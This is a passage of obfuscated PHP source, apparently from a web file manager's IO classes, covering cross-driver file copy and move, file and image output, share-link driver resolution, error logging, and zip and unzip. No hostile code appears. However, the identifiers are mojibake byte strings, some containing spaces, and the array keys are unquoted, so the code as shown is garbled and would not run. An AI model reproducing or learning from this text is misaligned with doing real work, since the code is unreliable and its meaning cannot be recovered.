Î->{$dö¼ƒóµÛ¶}($C£ÑÔ—ÅÉã, $c¼Û“ß×Èˆ, $eì¾Ø¬ç¹); } } goto Fø‰‘íÀºÎ; aËâ—›²Ö”: if ($d‹ËÚÁ˜Èİ) { $bë³“£” = $d‹ËÚÁ˜Èİ->getPathOuter($bë³“£”); } return $bë³“£”; goto eÅƒâ¯¶¿£; Fø‰‘íÀºÎ: $dßøå„¶†Ã = $B„ÈÚÕ…¢->isFile($C£ÑÔ—ÅÉã); if (!$dßøå„¶†Ã && $EÕ¨¶¾ Î->getType() == $aÓ¢Ëäæ’„[710] && $B„ÈÚÕ…¢->getType() == $aÓ¢Ëäæ’„[105]) { $bë³“£” = $EÕ¨¶¾ Î->copyFolderFromIO($B„ÈÚÕ…¢, $C£ÑÔ—ÅÉã, $c¼Û“ß×Èˆ, $eì¾Ø¬ç¹, $aåã‚Æ‘˜, $e¿Ã› ù ƒ); } else { $bë³“£” = self::copyPath($B„ÈÚÕ…¢, $C£ÑÔ—ÅÉã, $EÕ¨¶¾ Î, $c¼Û“ß×Èˆ, $eì¾Ø¬ç¹, $aåã‚Æ‘˜, $dßøå„¶†Ã, $e¿Ã› ù ƒ); } if ($bë³“£” && $aåã‚Æ‘˜) { $B„ÈÚÕ…¢->remove($C£ÑÔ—ÅÉã); } goto aËâ—›²Ö”; eÅƒâ¯¶¿£: } private static function check($C§˜†¹ŒİÁ, $e”Ç²êÁù, $F­¤‰ ×³, &$eÓ ÓÃï§¤) { $DÌâî‰ÁÎ½ =& $_SERVER[¹…ÕÄ]; if (self::driverIsSame($C§˜†¹ŒİÁ, $F­¤‰ ×³) && $C§˜†¹ŒİÁ->isFolder($e”Ç²êÁù) && $C§˜†¹ŒİÁ->isParentOf($e”Ç²êÁù, $eÓ ÓÃï§¤)) { show_json(LNG($DÌâî‰ÁÎ½[1028]), !1); } if (!$C§˜†¹ŒİÁ->exist($e”Ç²êÁù)) { show_json(LNG($DÌâî‰ÁÎ½[104]), !1); } } private static function copyPath($bœ¹Ü°µ¶, $E­ÆÇËà÷ò, $E“à§Æñ, $CâÙŒäÃôí, $Dœî‹Í¸“ù, $B…õÈÛô ß, $aßêò³Óö, $A†Æ§Ô‡Ú² = false) { goto D¾»‚Şª²ª; D¾»‚Şª²ª: $CÉÂˆŸ¼Ä =& $_SERVER[¹…ÕÄ]; $DÃõ¶Œš = $A†Æ§Ô‡Ú² ? $A†Æ§Ô‡Ú² : $bœ¹Ü°µ¶->pathThis($E­ÆÇËà÷ò); if ($Dœî‹Í¸“ù) { $E±‡İ£À¦ù = $E“à§Æñ->fileNameExist($CâÙŒäÃôí, $DÃõ¶Œš); $DÃõ¶Œš = $E“à§Æñ->fileNameAuto($CâÙŒäÃôí, $DÃõ¶Œš, $Dœî‹Í¸“ù, !$aßêò³Óö); $Dœî‹Í¸“ù = $E±‡İ£À¦ù ? $Dœî‹Í¸“ù : !1; } goto AÔ„§áÄğÔ; B¾ùÈ©Â‰: $D™’—ãÂøÕ = array_merge($DßÕÃÅÎ‹É[$CÉÂˆŸ¼Ä[73]], $DßÕÃÅÎ‹É[$CÉÂˆŸ¼Ä[74]]); foreach ($D™’—ãÂøÕ as $Bì¤ÊğÓ… ) { $bßí»Î«×¹ = $Bì¤ÊğÓ… [$CÉÂˆŸ¼Ä[29]] == $CÉÂˆŸ¼Ä[173]; $E­ÆÇËà÷ò = $bœ¹Ü°µ¶->getPathInner($Bì¤ÊğÓ… [$CÉÂˆŸ¼Ä[75]]); $aˆé±„£‡¢ = self::copyPath($bœ¹Ü°µ¶, $E­ÆÇËà÷ò, $E“à§Æñ, $CâÙŒäÃôí, $Dœî‹Í¸“ù, $B…õÈÛô ß, $bßí»Î«×¹); if (!$aˆé±„£‡¢) { IO::errorTips($CÉÂˆŸ¼Ä[1029] . $E­ÆÇËà÷ò . $CÉÂˆŸ¼Ä[66] . $CâÙŒäÃôí); } } return $c’–†«ğÛ; goto AçÔä—Àˆé; AÔ„§áÄğÔ: if ($aßêò³Óö) { return self::copyFile($bœ¹Ü°µ¶, $E­ÆÇËà÷ò, $E“à§Æñ, $CâÙŒäÃôí, $DÃõ¶Œš, $B…õÈÛô ß); } if ($Dœî‹Í¸“ù == REPEAT_RENAME_FOLDER) { $Dœî‹Í¸“ù = !1; } $ešğ“âÕ¥ = rtrim($CâÙŒäÃôí, $CÉÂˆŸ¼Ä[8]) . $CÉÂˆŸ¼Ä[8] . $DÃõ¶Œš; goto aé©¿ôµÀÅ; aé©¿ôµÀÅ: $c’–†«ğÛ = $E“à§Æñ->mkdir($E“à§Æñ->getPath($ešğ“âÕ¥)); $CâÙŒäÃôí = $E“à§Æñ->getPathInner($c’–†«ğÛ); $DßÕÃÅÎ‹É = $bœ¹Ü°µ¶->listPath($E­ÆÇËà÷ò, !0); goto B¾ùÈ©Â‰; AçÔä—Àˆé: } private static function copyFile($c¤È”ñØ™, $bŠ¯«›ÍÃ, $aùÙÛ·¼ª, $fß™¼ Ÿ¨¦, $Fç’ß”Ã¢Ì, $e¥®ĞÏí–Î) { goto c†£ì÷ÂßÄ; b¥‰°â—á¸: Hook::trigger($CĞë¨•Áˆø[1032], $c¤È”ñØ™, $bŠ¯«›ÍÃ, $aùÙÛ·¼ª, $fß™¼ Ÿ¨¦, $Fç’ß”Ã¢Ì, $FàçĞ¶¡áñ); return $FàçĞ¶¡áñ; goto fÄÔÌ®‚–; eë¢©‡¦²: Hook::trigger($CĞë¨•Áˆø[1031], $c¤È”ñØ™, $bŠ¯«›ÍÃ, $aùÙÛ·¼ª, $fß™¼ Ÿ¨¦, $Fç’ß”Ã¢Ì, $EõŞìàÇÌ); if (self::driverIsSame($c¤È”ñØ™, $aùÙÛ·¼ª)) { if ($e¥®ĞÏí–Î) { $FàçĞ¶¡áñ = $aùÙÛ·¼ª->moveFile($bŠ¯«›ÍÃ, $fß™¼ Ÿ¨¦); } else { $FàçĞ¶¡áñ = $aùÙÛ·¼ª->copyFile($bŠ¯«›ÍÃ, $fß™¼ Ÿ¨¦); } Hook::trigger($CĞë¨•Áˆø[1032], $c¤È”ñØ™, $bŠ¯«›ÍÃ, $aùÙÛ·¼ª, $fß™¼ Ÿ¨¦, $Fç’ß”Ã¢Ì, $FàçĞ¶¡áñ); return $FàçĞ¶¡áñ; } $AÖ«¬À˜¾î = TEMP_FILES; goto AâÈ¸ÔŠ²È; AâÈ¸ÔŠ²È: mk_dir($AÖ«¬À˜¾î); $aì®Ñ†· = $AÖ«¬À˜¾î . $EõŞìàÇÌ; $aì®Ñ†· = $c¤È”ñØ™->download($bŠ¯«›ÍÃ, $aì®Ñ†·); goto E¸ƒÕê¬¿¦; E¸ƒÕê¬¿¦: $aì®Ñ†· = $c¤È”ñØ™->iconvApp($aì®Ñ†·); $FàçĞ¶¡áñ = $aùÙÛ·¼ª->upload($fß™¼ Ÿ¨¦, $aì®Ñ†·, $e¥®ĞÏí–Î); self::remove($AÖ«¬À˜¾î . $EõŞìàÇÌ); goto b¥‰°â—á¸; c†£ì÷ÂßÄ: $CĞë¨•Áˆø =& $_SERVER[¹…ÕÄ]; $fß™¼ Ÿ¨¦ = $aùÙÛ·¼ª->getPath(rtrim($fß™¼ Ÿ¨¦, $CĞë¨•Áˆø[8]) . $CĞë¨•Áˆø[8] . $Fç’ß”Ã¢Ì); $EõŞìàÇÌ = $CĞë¨•Áˆø[1030] . time() . rand_string(5); goto eë¢©‡¦²; fÄÔÌ®‚–: } public static function pathFather($fœëÙ©‰Ô”) { $dëİŠçïğö = IO::init($fœëÙ©‰Ô”); $c¹„²êë = $dëİŠçïğö->pathFather($dëİŠçïğö->path); return $dëİŠçïğö->getPathOuter($c¹„²êë); } public static function fileOut($AØ¢ÁÏ®˜, $eµ”½²™¹’ = false, $dğî—ĞŒè‚ = false, $C¼Ù¸×’ÌÌ = '') { $CÕÚ¡œ†ğ = self::driverMake($AØ¢ÁÏ®˜); if ($CÕÚ¡œ†ğ->isFileOutServer()) { return $CÕÚ¡œ†ğ->fileOutServer($AØ¢ÁÏ®˜, $eµ”½²™¹’, $dğî—ĞŒè‚, $C¼Ù¸×’ÌÌ); } return $CÕÚ¡œ†ğ->fileOut($AØ¢ÁÏ®˜, $eµ”½²™¹’, $dğî—ĞŒè‚, $C¼Ù¸×’ÌÌ); } public static function fileOutImage($CÂŠÛ×ƒÓœ, $c¤à„±ˆÂ† = 250) { $D§‚íÓÉËµ = array(250, 600, 1200, 3000, 5000); for ($aØ¸‰–°…Ó = 0; $aØ¸‰–°…Ó < count($D§‚íÓÉËµ); $aØ¸‰–°…Ó++) { if ($aØ¸‰–°…Ó == 0 && $c¤à„±ˆÂ† <= $D§‚íÓÉËµ[$aØ¸‰–°…Ó]) { $c¤à„±ˆÂ† = $D§‚íÓÉËµ[$aØ¸‰–°…Ó]; break; } else { if ($c¤à„±ˆÂ† > $D§‚íÓÉËµ[$aØ¸‰–°…Ó - 1] && $c¤à„±ˆÂ† <= $D§‚íÓÉËµ[$aØ¸‰–°…Ó]) { $c¤à„±ˆÂ† = $D§‚íÓÉËµ[$aØ¸‰–°…Ó]; break; } else { if ($aØ¸‰–°…Ó == count($D§‚íÓÉËµ) - 1 && $c¤à„±ˆÂ† > $D§‚íÓÉËµ[$aØ¸‰–°…Ó]) { $c¤à„±ˆÂ† = $D§‚íÓÉËµ[$aØ¸‰–°…Ó]; break; } } } } $F®¯”œÅ¢ = self::driverMake($CÂŠÛ×ƒÓœ); if ($F®¯”œÅ¢->isFileOutServer()) { return $F®¯”œÅ¢->fileOutImageServer($CÂŠÛ×ƒÓœ, $c¤à„±ˆÂ†); } return $F®¯”œÅ¢->fileOutImage($CÂŠÛ×ƒÓœ, $c¤à„±ˆÂ†); } private static function driverIsSame($FËŠ¹‘‚ª, $A×î·øŠ‹î) { goto e‰ÁØ‡ã‰½; eËØØÏÃá´: if ($e¨é½À­È¸ != $cÌ¨ìˆ˜“Ø) { return !1; } if ($e¨é½À­È¸ == $F¹²çŸ‚§[710]) { return !0; } if ($e¨é½À­È¸ == $F¹²çŸ‚§[105]) { return !0; } goto FÊ­Çøã¦‡; FÊ­Çøã¦‡: if ($FËŠ¹‘‚ª->pathDriver == $A×î·øŠ‹î->pathDriver) { return !0; } return !1; goto EËñ¥¨“¼ò; e‰ÁØ‡ã‰½: $F¹²çŸ‚§ =& $_SERVER[¹…ÕÄ]; $e¨é½À­È¸ = $FËŠ¹‘‚ª->getType(); $cÌ¨ìˆ˜“Ø = $A×î·øŠ‹î->getType(); goto eËØØÏÃá´; EËñ¥¨“¼ò: } public static function copyUpdate($F±“ŠÏ¡»Ã, $F´øŒœˆÀã) { goto e¨›™˜††; DµÛ·§ó: Hook::trigger($Dë×¼Á”Ì[1036], $F±“ŠÏ¡»Ã, $F´øŒœˆÀã, $aßŠ±Š¯©‚); foreach ($BîÊğª†Ù as $fÄÄ×ĞÎ¹î) { IO::mkdir($fÄÄ×ĞÎ¹î); } foreach ($FöÅˆŒà‰Ë as $fÄÄ×ĞÎ¹î) { IO::copy($fÄÄ×ĞÎ¹î[$Dë×¼Á”Ì[1033]], $fÄÄ×ĞÎ¹î[$Dë×¼Á”Ì[1034]], REPEAT_REPLACE); } goto Cè›äØÑÅ¸; CÃÅØˆ«ïÔ: $BîÊğª†Ù = array(); foreach ($Bš…¦ğ‘À as $Dà‰«“­ƒŸ => $fÄÄ×ĞÎ¹î) { if (isset($Cß…òËæÜÄ[$Dà‰«“­ƒŸ])) { if ($fÄÄ×ĞÎ¹î[$Dë×¼Á”Ì[76]] == 1) { continue; } if ($Cß…òËæÜÄ[$Dà‰«“­ƒŸ][$Dë×¼Á”Ì[77]] == $fÄÄ×ĞÎ¹î[$Dë×¼Á”Ì[77]]) { continue; } } if ($fÄÄ×ĞÎ¹î[$Dë×¼Á”Ì[76]] == 1) { $BîÊğª†Ù[] = $F´øŒœˆÀã . $Dë×¼Á”Ì[8] . $Dà‰«“­ƒŸ; continue; } $dàÏ¯àååğ = strstr(trim($Dà‰«“­ƒŸ, $Dë×¼Á”Ì[8]), $Dë×¼Á”Ì[8]) ? get_path_father($Dà‰«“­ƒŸ) : $Dë×¼Á”Ì[33]; $FöÅˆŒà‰Ë[] = array($Dë×¼Á”Ì[1033] => $fÄÄ×ĞÎ¹î[$Dë×¼Á”Ì[75]], $Dë×¼Á”Ì[1034] => rtrim($F´øŒœˆÀã, $Dë×¼Á”Ì[8]) . $Dë×¼Á”Ì[8] . $dàÏ¯àååğ, $Dë×¼Á”Ì[1035] => $fÄÄ×ĞÎ¹î); } $aßŠ±Š¯©‚ = array($Dë×¼Á”Ì[173] => $FöÅˆŒà‰Ë, $Dë×¼Á”Ì[76] => $BîÊğª†Ù); goto DµÛ·§ó; e¨›™˜††: $Dë×¼Á”Ì =& $_SERVER[¹…ÕÄ]; if (!IO::exist($F±“ŠÏ¡»Ã)) { return !1; } if (!IO::exist($F´øŒœˆÀã)) { IO::mkdir($F´øŒœˆÀã); } goto fºåö­æÇÉ; fºåö­æÇÉ: $Bš…¦ğ‘À = self::_listAll($F±“ŠÏ¡»Ã); $Cß…òËæÜÄ = self::_listAll($F´øŒœˆÀã); $FöÅˆŒà‰Ë = array(); goto CÃÅØˆ«ïÔ; Cè›äØÑÅ¸: } private static function _listAll($cÖ×„İ‹Ó) { $eˆè“ÈŠ¼Š =& $_SERVER[¹…ÕÄ]; $cÖ×„İ‹Ó = KodIO::clear($cÖ×„İ‹Ó); $f‹íöİªÄ = IO::listAll($cÖ×„İ‹Ó); foreach ($f‹íöİªÄ as &$E‰ŒÍ‘êë) { $EÜâÜ¯âÒ = substr($E‰ŒÍ‘êë[$eˆè“ÈŠ¼Š[75]], strlen($cÖ×„İ‹Ó)); $E‰ŒÍ‘êë[$eˆè“ÈŠ¼Š[1037]] = trim($EÜâÜ¯âÒ, $eˆè“ÈŠ¼Š[8]); } unset($E‰ŒÍ‘êë); return array_to_keyvalue($f‹íöİªÄ, $eˆè“ÈŠ¼Š[1037]); } public static function fileSubstr($c½×–¬ğÄ½, $B³×“×Ş»¬, $FŒŠùêØ›® = false) { goto a°¡Éââ¨; B‘ÎºìæÑƒ: if ($FŒŠùêØ›® <= 0) { return $AÅƒšŞ’Ğ›[33]; } if ($B³×“×Ş»¬ < 0 || $B³×“×Ş»¬ >= $fè’§»Öèã || $FŒŠùêØ›® > 1024 * 1024 * 5) { throw new Exception("\146\x69\x6c\x65\122\145\x61\144\x20\x65\x72\162\157\162\41\40\163\164\141\162\x74\75{$B³×“×Ş»¬}\73\154\145\x6e\x67\x74\150\75{$FŒŠùêØ›®}\73\40\163\x69\172\145\x3d{$fè’§»Öèã}\x3b"); } $f¿Êç—¶™Û = $d‚öèÙ–->fileSubstr($c½×–¬ğÄ½, $B³×“×Ş»¬, $FŒŠùêØ›®); goto Bƒ–ÕÅéÆ•; a°¡Éââ¨: $AÅƒšŞ’Ğ› =& $_SERVER[¹…ÕÄ]; $d‚öèÙ– = self::driverMake($c½×–¬ğÄ½); $fè’§»Öèã = $d‚öèÙ–->size($c½×–¬ğÄ½); goto A±ôÕÉñ§š; eó×İ: if ($FŒŠùêØ›® === !1) { $FŒŠùêØ›® = $fè’§»Öèã - $B³×“×Ş»¬; } if ($B³×“×Ş»¬ + $FŒŠùêØ›® > $fè’§»Öèã) { $FŒŠùêØ›® = $fè’§»Öèã - $B³×“×Ş»¬; } if (!$fè’§»Öèã && $d‚öèÙ–->getType() == $AÅƒšŞ’Ğ›[105] && !$d‚öèÙ–->exist($c½×–¬ğÄ½)) { throw new Exception($AÅƒšŞ’Ğ›[1038] . LNG($AÅƒšŞ’Ğ›[1039]) . $AÅƒšŞ’Ğ›[903] . get_path_this($c½×–¬ğÄ½) . $AÅƒšŞ’Ğ›[33]); } goto B‘ÎºìæÑƒ; A±ôÕÉñ§š: $a’‡‘É×íã = $B³×“×Ş»¬; $FŠé‰Ñ³Ñ¨ = $FŒŠùêØ›®; if ($B³×“×Ş»¬ < 0) { $B³×“×Ş»¬ = $fè’§»Öèã + $B³×“×Ş»¬; } goto eó×İ; Bƒ–ÕÅéÆ•: if (!$f¿Êç—¶™Û && $FŒŠùêØ›® && isset($GLOBALS[$AÅƒšŞ’Ğ›[1040]])) { throw new Exception($GLOBALS[$AÅƒšŞ’Ğ›[1040]][$AÅƒšŞ’Ğ›[1041]]); } return $f¿Êç—¶™Û; goto døÇæÙŒá; døÇæÙŒá: } private static function driverMake(&$C‹ˆ½„¢Ñ¯) { goto AìÄ‡ÔØ‰; AìÄ‡ÔØ‰: $e“„·´î—Å =& $_SERVER[¹…ÕÄ]; $DÅ„æƒš±£ = KodIO::parse($C‹ˆ½„¢Ñ¯); if (!self::$driverListSystem) { $aŠç„ãÛ³÷ = Model($e“„·´î—Å[719])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($aŠç„ãÛ³÷, $e“„·´î—Å[388]); } goto b¿„£«šÀ; Bìø£Ø˜Æ: return $bÛÚ°–…ÙÎ; goto DªæÂï®—¢; b¿„£«šÀ: if ($DÅ„æƒš±£[$e“„·´î—Å[29]] == KodIO::KOD_IO && !self::$driverListSystem[$DÅ„æƒš±£[$e“„·´î—Å[388]]]) { return !1; } $C‹ˆ½„¢Ñ¯ = $DÅ„æƒš±£[$e“„·´î—Å[1042]]; $bÛÚ°–…ÙÎ = self::driverGet($DÅ„æƒš±£, $C‹ˆ½„¢Ñ¯); goto Bìø£Ø˜Æ; DªæÂï®—¢: } private static function driverGet($eØïÎå¼¥‰, &$b£ìÖŸˆ’) { goto CßÊÍÊôäª; CßÊÍÊôäª: $cŞ¿ì Æã =& $_SERVER[¹…ÕÄ]; $dÛö©„µ§ƒ = $eØïÎå¼¥‰[$cŞ¿ì Æã[1043]]; $fÏÖŒ†Æò = $eØïÎå¼¥‰[$cŞ¿ì Æã[388]]; goto EÉ³áÛ—Ğ‚; EÉ³áÛ—Ğ‚: switch ($eØïÎå¼¥‰[$cŞ¿ì Æã[29]]) { case KodIO::KOD_IO: $DĞâ¬Ğö¨² = self::$driverListSystem[$fÏÖŒ†Æò]; break; case KodIO::KOD_SOURCE: $b£ìÖŸˆ’ = $fÏÖŒ†Æò . $b£ìÖŸˆ’; $DĞâ¬Ğö¨² = array($cŞ¿ì Æã[1044] => $cŞ¿ì Æã[1045], $cŞ¿ì Æã[6] => $eØïÎå¼¥‰); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $D»öÈÊ¸˜ä = $GLOBALS[$cŞ¿ì Æã[1046]]; self::$driverListUser = array_to_keyvalue($D»öÈÊ¸˜ä, $cŞ¿ì Æã[388]); } $DĞâ¬Ğö¨² = self::$driverListUser[$fÏÖŒ†Æò]; break; case KodIO::KOD_SHARE_LINK: $DĞâ¬Ğö¨² = array($cŞ¿ì Æã[1044] => $cŞ¿ì Æã[1047], $cŞ¿ì Æã[6] => $eØïÎå¼¥‰); $fã­è˜±Õ = Action($cŞ¿ì Æã[1048])->sharePathInfo($eØïÎå¼¥‰[$cŞ¿ì Æã[75]]); $b£ìÖŸˆ’ = $fã­è˜±Õ[$cŞ¿ì Æã[390]]; if (!$fã­è˜±Õ[$cŞ¿ì Æã[390]]) { $aÖ±¿÷¶¼¹ = Model($cŞ¿ì Æã[558])->getInfo($fã­è˜±Õ[$cŞ¿ì Æã[462]]); $b£ìÖŸˆ’ = KodIO::clear($aÖ±¿÷¶¼¹[$cŞ¿ì Æã[1049]] . $eØïÎå¼¥‰[$cŞ¿ì Æã[1042]]); $eØïÎå¼¥‰[$cŞ¿ì Æã[460]] = $aÖ±¿÷¶¼¹; $eØïÎå¼¥‰[$cŞ¿ì Æã[1026]] = $b£ìÖŸˆ’; $DĞâ¬Ğö¨² = array($cŞ¿ì Æã[1044] => $cŞ¿ì Æã[1050], $cŞ¿ì Æã[6] => $eØïÎå¼¥‰); } break; case KodIO::KOD_SHARE_ITEM: $DĞâ¬Ğö¨² = array($cŞ¿ì Æã[1044] => $cŞ¿ì Æã[1051], $cŞ¿ì Æã[6] => $eØïÎå¼¥‰); $aÖ±¿÷¶¼¹ = Model($cŞ¿ì Æã[558])->getInfo($eØïÎå¼¥‰[$cŞ¿ì Æã[388]]); if ($aÖ±¿÷¶¼¹[$cŞ¿ì Æã[390]] == $cŞ¿ì Æã[491]) { $b£ìÖŸˆ’ = KodIO::clear($aÖ±¿÷¶¼¹[$cŞ¿ì Æã[1049]] . $eØïÎå¼¥‰[$cŞ¿ì Æã[1042]]); $eØïÎå¼¥‰[$cŞ¿ì Æã[460]] = $aÖ±¿÷¶¼¹; $eØïÎå¼¥‰[$cŞ¿ì Æã[1026]] = $b£ìÖŸˆ’; $DĞâ¬Ğö¨² = array($cŞ¿ì Æã[1044] => $cŞ¿ì Æã[1052], $cŞ¿ì Æã[6] => $eØïÎå¼¥‰); } else { if (!$b£ìÖŸˆ’) { $b£ìÖŸˆ’ = $aÖ±¿÷¶¼¹[$cŞ¿ì Æã[390]]; } } break; default: $b£ìÖŸˆ’ = $eØïÎå¼¥‰[$cŞ¿ì Æã[75]]; $DĞâ¬Ğö¨² = array($cŞ¿ì Æã[1044] => $cŞ¿ì Æã[1053]); break; } $B ÜÍ·Ã’ = $eØïÎå¼¥‰[$cŞ¿ì Æã[75]]; if (!isset(self::$driverCache[$B ÜÍ·Ã’])) { $eÌ‹éÆ–³¬ = strtolower($DĞâ¬Ğö¨²[$cŞ¿ì Æã[93]]); $d•º¶ËéœÔ = $GLOBALS[$cŞ¿ì Æã[6]][$cŞ¿ì Æã[87]][$cŞ¿ì Æã[771]]; $c­ÚˆÕ“Ïˆ = $cŞ¿ì Æã[71] . (isset($d•º¶ËéœÔ[$eÌ‹éÆ–³¬]) ? $d•º¶ËéœÔ[$eÌ‹éÆ–³¬] : ucfirst($eÌ‹éÆ–³¬)); if (!class_exists($c­ÚˆÕ“Ïˆ)) { show_json("{$c­ÚˆÕ“Ïˆ}\x20\156\157\x74\40\145\x78\x69\163\x74\x73\41", !1); } $B‘¹º°° · = isset($DĞâ¬Ğö¨²[$cŞ¿ì Æã[6]]) ? $DĞâ¬Ğö¨²[$cŞ¿ì Æã[6]] : !1; self::$driverCache[$B ÜÍ·Ã’] = new $c­ÚˆÕ“Ïˆ($B‘¹º°° ·); } goto EƒÎŒæ…áƒ; B‚Ô½Š†ÕØ: $Aç­Šò®¢“->path = $b£ìÖŸˆ’; return $Aç­Šò®¢“; goto b©•Šá•¸¦; A´¡•…ßÀ‹: if (isset($DĞâ¬Ğö¨²[$cŞ¿ì Æã[6]][$cŞ¿ì Æã[1054]])) { $Aç­Šò®¢“->pathBase = rtrim($DĞâ¬Ğö¨²[$cŞ¿ì Æã[6]][$cŞ¿ì Æã[1054]], $cŞ¿ì Æã[8]) . $cŞ¿ì Æã[8]; $b£ìÖŸˆ’ = $Aç­Šò®¢“->pathBase . ltrim($b£ìÖŸˆ’, $cŞ¿ì Æã[8]); } $b£ìÖŸˆ’ = $Aç­Šò®¢“->getPath($b£ìÖŸˆ’); if (isset($eØïÎå¼¥‰[$cŞ¿ì Æã[1026]])) { $b£ìÖŸˆ’ = $eØïÎå¼¥‰[$cŞ¿ì Æã[1026]]; } goto B‚Ô½Š†ÕØ; EƒÎŒæ…áƒ: $Aç­Šò®¢“ = self::$driverCache[$B ÜÍ·Ã’]; $Aç­Šò®¢“->pathDriver = $dÛö©„µ§ƒ; $Aç­Šò®¢“->pathBase = $cŞ¿ì Æã[33]; goto A´¡•…ßÀ‹; b©•Šá•¸¦: } public static function errorTips($bè˜³ÅˆÚ = false) { goto f‹¯­²ÒÂ; eÏÌºŞØÕ•: if ($bè˜³ÅˆÚ === -1) { return $Eì©ˆ£ê‡ô ? $Eì©ˆ£ê‡ô[count($Eì©ˆ£ê‡ô) - 1] : $DöÔĞÖÚä”[33]; } if ($bè˜³ÅˆÚ === !1) { return implode($DöÔĞÖÚä”[227], $Eì©ˆ£ê‡ô); } if (count($Eì©ˆ£ê‡ô) >= $FÙ·‡À£ô) { $Eì©ˆ£ê‡ô = array_slice($Eì©ˆ£ê‡ô, $FÙ·‡À£ô * 0.5, $FÙ·‡À£ô); } goto A›ÁÒÓãˆÁ; A›ÁÒÓãˆÁ: $Eì©ˆ£ê‡ô[] = $bè˜³ÅˆÚ; write_log($DöÔĞÖÚä”[159] . ACTION . $DöÔĞÖÚä”[1055] . $bè˜³ÅˆÚ, $DöÔĞÖÚä”[1056]); goto EêĞÚé¸‘¤; f‹¯­²ÒÂ: $DöÔĞÖÚä” =& $_SERVER[¹…ÕÄ]; static $Eì©ˆ£ê‡ô = array(); $FÙ·‡À£ô = 1000; goto eÏÌºŞØÕ•; EêĞÚé¸‘¤: } public static function getLastError($E«˜Á·Ç³ = '') { $ağ®—µ³ÓÖ = self::errorTips(-1); return $ağ®—µ³ÓÖ ? $ağ®—µ³ÓÖ : $E«˜Á·Ç³; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $cÑŒˆò¸¯¦; if (!$cÑŒˆò¸¯¦) { $D†®õ£¦²Ë = IO::init($_SERVER[¹…ÕÄ][8]); } return $D†®õ£¦²Ë; } private static function iconvSystem($fĞËö­ƒ³³) { return self::local()->iconvSystem($fĞËö­ƒ³³); } private static function iconvApp($B¨š·î˜µˆ) { return self::local()->iconvApp($B¨š·î˜µˆ); } public static function zip($EŞÖ¾¢ˆ”, $c¼µñ¤Ú•Â = "\172\151\x70", $fîÓÌÎ‘§¼ = '', $Cà‡­… = REPEAT_RENAME) { goto F­„¥Î”í…; Fˆ™À©¹‰: $f—¡…¸‰ = !1; if (!$fîÓÌÎ‘§¼ && $dóù£Ñ©¬é->getType() == $dñ¶¤‡›½Ú[105]) { $F¹ğÏÂë = self::zipFileList($EŞÖ¾¢ˆ”); } else { $f—¡…¸‰ = $fîÓÌÎ‘§¼ ? $fîÓÌÎ‘§¼ : TEMP_FILES . $dñ¶¤‡›½Ú[1057] . time() . rand_string(8) . $dñ¶¤‡›½Ú[8]; mk_dir($f—¡…¸‰); $F¹ğÏÂë = self::zipFileList($EŞÖ¾¢ˆ”, $f—¡…¸‰); } $b…ÍÙæäè = $eåà°…¯›[$dñ¶¤‡›½Ú[28]]; goto f–æœ‡Ô„; F­„¥Î”í…: $dñ¶¤‡›½Ú =& $_SERVER[¹…ÕÄ]; $dóù£Ñ©¬é = self::init($EŞÖ¾¢ˆ”[0][$dñ¶¤‡›½Ú[75]]); $eåà°…¯› = self::info($EŞÖ¾¢ˆ”[0][$dñ¶¤‡›½Ú[75]]); goto Fˆ™À©¹‰; A‡½§Ú: if ($fîÓÌÎ‘§¼ || !$f—¡…¸‰) { if ($f—¡…¸‰ && strstr($f—¡…¸‰, TEMP_FILES)) { $bŠÏ×ğì¡á = $F¹ğÏÂë = array(); recursion_dir($a¹¦À’•‰©, $bŠÏ×ğì¡á, $F¹ğÏÂë, 0); foreach ($bŠÏ×ğì¡á as $f­ùÆ†°) { del_dir($f­ùÆ†°); } foreach ($F¹ğÏÂë as $eÒ¬¸Íõ±) { if ($eÒ¬¸Íõ± == $C‡“”¸Šè) { continue; } del_file($eÒ¬¸Íõ±); } } return $A‰¸‡è˜¹; } $CæãƒÅ‘£¤ = self::pathFather($eåà°…¯›[$dñ¶¤‡›½Ú[75]]); $FÁÇÀĞä¢Ä = self::move($A‰¸‡è˜¹, $CæãƒÅ‘£¤, $Cà‡­…); goto aĞİ˜ï¬¤; BêÔŒƒ‡’: foreach ($F¹ğÏÂë as $bì’›’² => $d—°‡ãêö) { $F¹ğÏÂë[$bì’›’²] = self::iconvSystem($d—°‡ãêö); } KodArchive::create($C‡“”¸Šè, $F¹ğÏÂë); if (!IO::exist($A‰¸‡è˜¹)) { if ($f—¡…¸‰) { del_dir($f—¡…¸‰); } show_json(LNG($dñ¶¤‡›½Ú[1059]), !1); } goto A‡½§Ú; D¥ö¡˜ÍÙˆ: $A‰¸‡è˜¹ = $a¹¦À’•‰© . $b…ÍÙæäè . $dñ¶¤‡›½Ú[94] . $c¼µñ¤Ú•Â; $A‰¸‡è˜¹ = get_filename_auto($A‰¸‡è˜¹, $dñ¶¤‡›½Ú[33], $Cà‡­…); $C‡“”¸Šè = self::iconvSystem($A‰¸‡è˜¹); goto BêÔŒƒ‡’; aĞİ˜ï¬¤: if (!$FÁÇÀĞä¢Ä) { del_dir($f—¡…¸‰); show_json(LNG($dñ¶¤‡›½Ú[1059]), !1); } del_dir($f—¡…¸‰); return $FÁÇÀĞä¢Ä; goto F½áñíõ; f–æœ‡Ô„: if (count($F¹ğÏÂë) > 1) { $dòÃÀ½ëƒ = IO::info(IO::pathFather($eåà°…¯›[$dñ¶¤‡›½Ú[75]])); $b…ÍÙæäè = $dòÃÀ½ëƒ[$dñ¶¤‡›½Ú[28]]; } $a¹¦À’•‰© = $f—¡…¸‰; if (!$a¹¦À’•‰©) { $a¹¦À’•‰© = get_path_father($eåà°…¯›[$dñ¶¤‡›½Ú[75]]); if (!$fîÓÌÎ‘§¼ && $dóù£Ñ©¬é->getType() == $dñ¶¤‡›½Ú[105]) { $a¹¦À’•‰© = get_path_father($dóù£Ñ©¬é->path); } $f¶âÅŠÍ£ô = IO::info($a¹¦À’•‰©); if (!$f¶âÅŠÍ£ô[$dñ¶¤‡›½Ú[194]]) { show_json(LNG($dñ¶¤‡›½Ú[1058]), !1); } } goto D¥ö¡˜ÍÙˆ; F½áñíõ: } public static function unzip($bÚŸŒ §‹, $f² Óõ¶Êª = "\162\x65\x70\x6c\141\x63\145") { goto bœğîâŒàÒ; bÌ²¤àòÖ: $a‡‚•¢¿½Š = KodArchive::extract($fÛÛ”˜Õ†¬, $FãÈ¨³°òæ . $dÉ¥‹Œîê…[8], $aÉñºÕŒ¤Í); 